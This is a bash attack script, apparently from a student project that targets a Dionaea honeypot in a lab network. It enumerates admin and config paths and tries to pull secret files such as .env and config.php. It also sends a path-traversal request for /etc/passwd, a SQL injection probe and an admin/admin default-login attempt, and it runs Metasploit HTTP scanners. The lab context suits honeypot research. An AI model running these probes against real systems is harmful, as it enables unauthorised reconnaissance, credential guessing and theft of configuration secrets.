#!/bin/bash
# HTTP exploitation - targets Dionaea

DIONAEA="172.16.0.30"
LOGDIR="/home/kali/Desktop/fyp/attack_scripts/logs/exploitation"

mkdir -p "$LOGDIR"

echo "HTTP exploitation on $DIONAEA"

if nc -zw2 "$DIONAEA" 80 2>/dev/null; then
    curl -s -m 10 http://$DIONAEA/ > "$LOGDIR/http_index_${DIONAEA}.html"
    curl -s -m 10 http://$DIONAEA/robots.txt > "$LOGDIR/http_robots_${DIONAEA}.txt"
    curl -s -m 10 -I http://$DIONAEA/ > "$LOGDIR/http_headers_${DIONAEA}.txt"
    
    for path in admin login backup config api phpmyadmin; do
        code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" http://$DIONAEA/$path/)
        [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$path: $code" >> "$LOGDIR/http_dirs_${DIONAEA}.txt"
    done
    
    for file in .htaccess config.php config.js .env; do
        code=$(curl -s -m 5 -o /dev/null -w "%{http_code}" http://$DIONAEA/$file)
        [ "$code" = "200" ] && curl -s -m 10 http://$DIONAEA/$file >> "$LOGDIR/http_files_${DIONAEA}.txt"
    done
    
    curl -s -m 10 "http://$DIONAEA/../../../etc/passwd" >> "$LOGDIR/http_lfi_${DIONAEA}.txt" 2>/dev/null
    curl -s -m 10 "http://$DIONAEA/api/users?id=1'" >> "$LOGDIR/http_sqli_${DIONAEA}.txt" 2>/dev/null
    curl -s -m 10 -X POST -d "username=admin&password=admin" http://$DIONAEA/api/login >> "$LOGDIR/http_login_${DIONAEA}.txt"
    
    RCFILE="/tmp/msf_http_${DIONAEA}.rc"
    cat > "$RCFILE" << EOF
use auxiliary/scanner/http/http_version
set RHOSTS $DIONAEA
run
use auxiliary/scanner/http/robots_txt
set RHOSTS $DIONAEA
run
exit
EOF
    timeout 60 msfconsole -q -r "$RCFILE" 2>/dev/null > "$LOGDIR/http_msf_${DIONAEA}.txt"
    rm -f "$RCFILE"
else
    echo "HTTP not open"
fi

echo "Done"
